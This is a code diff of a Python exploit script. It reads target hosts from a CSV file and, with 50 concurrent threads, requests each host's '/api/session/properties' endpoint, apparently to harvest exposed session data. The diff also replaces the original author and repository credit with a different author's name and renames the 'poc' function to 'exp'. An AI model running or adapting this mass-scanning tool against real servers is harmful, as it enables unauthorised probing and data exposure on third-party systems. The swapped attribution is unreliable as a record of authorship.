@@ -1,7 +1,7 @@
 #!/usr/bin/python3
 # -*- coding:utf-8 -*-
-# author:ADummy
-# from:https://github.com/ADummmy/exploits
+# author:MDSEC
+# from:https://github.com/MD-SEC/MDPOCS
 
 import sys
 import requests
@@ -22,7 +22,7 @@ if len(sys.argv) != 2:
     print(
         '+----------------------------------------------------------------------------------------------------------+')
     sys.exit()
-def poc(host):
+def exp(host):
     url = "http://" + host
     headers = {
         "Host": "%s" % host,
@@ -35,6 +35,7 @@ def poc(host):
         "Accept-Language": "zh-CN,zh;q=0.9",
         "Connection": "close",
     }
+    
     vulurl = url + "/api/session/properties"
     try:
         r = requests.get(vulurl, headers=headers)
@@ -53,4 +54,4 @@ if __name__ == '__main__':
     reader = csv.reader(data)
     with ThreadPoolExecutor(50) as pool:
         for row in reader:
-            pool.submit(poc, row[0])
+            pool.submit(exp, row[0])
